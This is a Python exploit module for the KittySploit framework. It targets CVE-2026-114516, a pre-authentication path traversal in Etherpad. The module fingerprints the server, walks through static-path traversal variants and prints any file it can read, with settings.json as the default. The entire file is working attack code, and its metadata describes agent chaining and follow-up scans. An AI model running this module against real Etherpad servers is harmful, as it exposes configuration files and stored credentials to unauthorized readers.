#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-114516 — Etherpad pre-auth arbitrary file read."""

from kittysploit import *
from lib.protocols.http.etherpad import Etherpad
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.path_traversal import Path_traversal


class Module(Auxiliary, Http_client, Etherpad, Path_traversal):
    __info__ = {
        "name": "Etherpad CVE-2026-114516 file read",
        "description": "Reads files through /static/ path traversal on Etherpad.",
        "author": ["LLCForge", "KittySploit Team"],
        "cve": ["CVE-2026-114516"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-114516"],
        "tags": ["etherpad", "lfi", "unauth", "cve-2026-114516", "auxiliary"],
        "agent": {
            "approval_required": True,
            "produces": ["file_read", "sensitive_data"],
            "chain": {"suggested_followups": ["scanner/http/etherpad_cve_2026_114516_detect"]},
        },
    }

    file_read = OptString("settings.json", "Remote file path", required=True)
    traversal_depth = OptInteger(8, "Traversal depth", required=False, advanced=True)
    output_limit = OptInteger(4096, "Print limit (0=full)", required=False, advanced=True)

    def run(self):
        fp = self.etherpad_fingerprint()
        if fp.get("is_etherpad"):
            print_success("Etherpad fingerprint")
        target = str(self.file_read or "settings.json")
        for path in self.static_traversal_paths(target, int(self.traversal_depth or 8)):
            resp = self.etherpad_read_path(path)
            if not resp or int(resp.status_code or 0) != 200:
                continue
            body = resp.text or ""
            if "<!doctype html" in body.lower()[:200]:
                continue
            lim = int(self.output_limit if self.output_limit is not None else 4096)
            snippet = body if lim <= 0 else body[:lim]
            print_success(f"Read via {path}")
            print_status(snippet)
            self.set_info(severity="critical", cve="CVE-2026-114516", path=path)
            return True
        print_error("File not leaked")
        return False